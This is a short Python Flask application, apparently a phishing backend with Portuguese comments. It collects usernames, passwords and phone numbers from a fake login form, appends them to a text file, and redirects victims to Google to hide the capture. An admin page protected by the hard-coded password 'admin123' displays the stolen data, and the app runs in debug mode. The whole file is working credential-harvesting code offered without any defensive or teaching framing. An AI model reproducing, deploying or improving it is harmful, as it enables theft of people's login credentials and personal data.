from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# Página inicial: login do usuário
@app.route('/')
def login():
    return render_template('login.html')

# Rota para capturar os dados do formulário e redirecionar para o Google
@app.route('/submit', methods=['POST'])
def submit():
    usuario = request.form.get('usuario')
    palavra_chave = request.form.get('palavra_chave')
    telemovel = request.form.get('telemovel')

    with open('dados.txt', 'a') as f:
        f.write(f'{usuario} | {palavra_chave} | {telemovel}\n')

    return redirect('https://www.google.com')

# Página de login do administrador
@app.route('/admin_login')
def admin_login():
    return render_template('admin_login.html')

# Rota protegida que exibe os dados capturados
@app.route('/admin', methods=['POST'])
def admin():
    senha = request.form.get('senha')
    if senha == 'admin123':
        try:
            with open('dados.txt', 'r') as f:
                linhas = f.readlines()
        except FileNotFoundError:
            linhas = []

        dados_formatados = [linha.strip().split(' | ') for linha in linhas]
        return render_template('admin.html', dados=dados_formatados)
    else:
        return "Senha incorreta"

if __name__ == '__main__':
    app.run(debug=True)
